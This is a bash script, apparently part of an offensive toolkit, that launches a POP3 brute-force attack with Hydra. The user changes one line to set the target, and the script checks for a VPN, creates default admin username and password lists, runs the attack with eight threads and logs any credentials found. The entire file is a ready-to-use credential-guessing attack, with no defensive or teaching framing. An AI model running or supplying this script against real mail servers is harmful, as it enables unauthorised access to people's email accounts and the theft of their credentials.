#!/bin/bash

# ═══════════════════════════════════════════════════════════════════
# POP3 BRUTE-FORCE - ONE LINE CHANGE
# ═══════════════════════════════════════════════════════════════════

TARGET="mail.example.com"  # <-- CHANGE THIS TO YOUR TARGET

# ═══════════════════════════════════════════════════════════════════

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

# Auto-source utilities
source "$PROJECT_ROOT/scripts/logger.sh" 2>/dev/null || true
source "$PROJECT_ROOT/scripts/vpn_check.sh" 2>/dev/null && require_vpn "false"

# Configuration
PORT=110
THREADS=8
USERLIST="$PROJECT_ROOT/config/admin_usernames.txt"
PASSLIST="$PROJECT_ROOT/config/admin_passwords.txt"

echo "════════════════════════════════════════════════════════"
echo "  POP3 BRUTE-FORCE ATTACK"
echo "  Target: $TARGET:$PORT"
echo "════════════════════════════════════════════════════════"

# Check if hydra exists
if ! command -v hydra &>/dev/null; then
    echo "[!] Hydra not installed. Run: bash install.sh"
    exit 1
fi

# Create default files if missing
[ ! -f "$USERLIST" ] && echo -e "admin\nuser\ntest" > "$USERLIST"
[ ! -f "$PASSLIST" ] && echo -e "password\nadmin\n123456" > "$PASSLIST"

# Execute attack
hydra -L "$USERLIST" -P "$PASSLIST" -t "$THREADS" -f pop3://"$TARGET:$PORT" | tee -a "$PROJECT_ROOT/logs/pop3_attack.log"

echo ""
echo "════════════════════════════════════════════════════════"
echo "  ATTACK COMPLETE - Check logs for results"
echo "════════════════════════════════════════════════════════"
